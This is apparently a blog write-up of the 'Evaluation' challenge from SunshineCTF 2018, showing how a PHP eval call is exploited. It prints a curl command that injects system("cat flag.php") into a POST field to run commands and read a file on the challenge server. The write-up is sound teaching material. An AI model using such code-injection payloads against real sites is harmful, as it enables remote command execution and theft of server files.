---
title: SunshineCTF - Evaluation Writeup
layout: post
date: '2018-04-10 08:00:00'
description: Writeup of Evaluation
image: https://i.imgur.com/1gRJwXK.png
tags:
- ctf
- writeup
author: Guilherme "k33r0k" Assmann
---
### SunshineCtf - Evaluation Writeup

`"Evaluation
Evaluate your life. How are you doing, and are you doing the best you can possibly do? Look deeper within yourself, beyond the obvious. Look at the source of it all.
Also, here's a PHP challenge."`

It was given us the following code:

![](https://i.imgur.com/1gRJwXK.png)

It's noticeable that the `eval` was vulnerable. It's very simple to get the shell, we can simply add a `system()` call to the request to get it included in the `eval`:

To get the shell I ran the following command to include the `system()` call:
`$ curl -d 'hello=system("cat flag.php")' -v "http://evaluation.web1.sunshinectf.org/"`

![](https://i.imgur.com/hiniyjD.png)
